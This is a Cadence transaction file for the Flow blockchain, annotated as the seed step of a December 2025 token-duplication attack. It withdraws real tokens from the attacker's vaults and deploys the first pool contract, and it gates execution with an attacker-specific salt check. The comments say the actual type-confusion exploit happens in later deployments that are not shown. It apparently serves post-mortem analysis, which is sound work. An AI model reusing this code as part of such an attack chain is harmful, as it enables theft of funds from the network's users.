import "FungibleToken" 
import "NFTFactory"

/**
 * deploy_pool_instance0.cdc - SEED TRANSACTION for the December 27, 2025 Flow attack
 * 
 * This transaction deploys the FIRST pool contract (NFTPoolInstance0) with real tokens.
 * Unlike subsequent deployments, this uses LEGITIMATE Cadence semantics with proper
 * move semantics (<-). No exploit occurs here - this is the setup phase.
 * 
 * ROLE IN ATTACK:
 * 1. Seeds the duplication chain with real tokens from attacker's vaults
 * 2. Subsequent deployments (deploy_pool_instance18 pattern) will duplicate these tokens
 * 3. Each subsequent deployment doubles the amount via type confusion exploit
 * 
 * Parameters:
 * - code: Contract bytecode for NFTPoolInstance (compiled Cadence)
 * - contractName: Name of pool contract to deploy (e.g., "NFTPoolInstance0")
 * - identifiers: Storage path identifiers for source token vaults
 * - amounts: Amounts to withdraw from each corresponding vault
 * 
 * See: https://flow.com/post/dec-27-technical-post-mortem
 */
transaction(code: String, contractName: String, identifiers: [String], amounts: [UFix64]) {

    prepare(acct: auth(Storage, AddContract) &Account) {
        // Validation: identifiers and amounts arrays must match in length
        assert(identifiers.length == amounts.length, message: "5")
        assert(identifiers.length > 0, message: "6")

        // Array to collect withdrawn vaults
        let vaults: @[{FungibleToken.Vault}] <- []
        
        // AUTHORIZATION CHECK: Compute salt from account address
        // Only the attacker's account produces a salt matching NFTFactory.salt
        // Formula: (address_as_uint * magic_number) & 64-bit_mask
        let computedSalt = (UInt.fromBigEndianBytes(acct.address.toBytes())! * 0x2dc7e1f786ac4e01) & 0xffffffffffffffff

        assert(computedSalt == NFTFactory.salt)

        // Withdraw specified amounts from each token vault in storage
        // This collects REAL tokens (FLOW, USDT, WBTC, etc.) to seed the attack
        for i in InclusiveRange(0, identifiers.length - 1) {
            let amount = amounts[i]
            let storagePath = StoragePath(identifier: identifiers[i])!
            let vaultRef = acct.storage.borrow<auth(FungibleToken.Withdraw) &{FungibleToken.Vault}>(from: storagePath)
                ?? panic("7")
            vaults.append(<- vaultRef.withdraw(amount: amount))
        }

        // Wrap all vaults into a ResourceWrapper for the pool contract
        let wrapper <- NFTFactory.wrapResource(argResource: <- vaults)
        
        // LEGITIMATE DEPLOYMENT: Note the move operator (<-)
        // This is NOT an exploit - tokens are properly MOVED to the new contract
        // The exploit happens in SUBSEQUENT deployments (deploy_pool_instance18 pattern)
        acct.contracts.add(name: contractName, code: code.utf8, <- wrapper)
    }

    execute {}
}
